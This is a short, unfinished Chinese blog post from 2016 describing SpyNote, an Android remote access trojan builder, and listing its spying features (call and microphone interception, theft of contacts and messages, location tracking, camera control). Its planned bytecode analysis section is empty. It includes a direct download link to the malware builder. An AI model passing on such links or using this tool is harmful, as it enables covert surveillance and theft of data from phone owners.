---
title: RAT（远程访问木马）名为 SpyNote ——这是个可对 Android 系统实现远程监听的工具
date: 2016-08-04 08:37:31
tags:
  - android
---

## SpyNote 能做什么？

SpyNote 实际上是用来创建 Android 恶意程序的工具，最近在不少恶意程序论坛传得特别火。它有一些相当吸引人的特性 

* 不需要获取系统的Root权限；
* 对通话进行监听；
* 窃取联系人和信息数据；
* 通过麦克风记录音；
* 恶意拨打电话；
* 安装恶意应用；
* 获取手机的IMEI码、WiFi MAC地址、无线网络运营商细节；
* 获取设备最新的GPS地理位置信息；
* 控制摄像头
听起来真是不错啊，都不需要 Android 系统做 Root 操作，真这么神？当然了，还是需要手机用户自己给予 SpyNote 这些权限才行，包括编辑短信、访问通话记录、联系人，以及修改、删除SD内容的权限——其实绝大部分用户看到这些权限请求都会毫不犹豫的点“下一步”或“允许”。
[spynote v2](http://dl.rekings.com/files/SpyNote%20v2.zip)  
## 用Cerbero profiler查看Dalvik字节码

## todo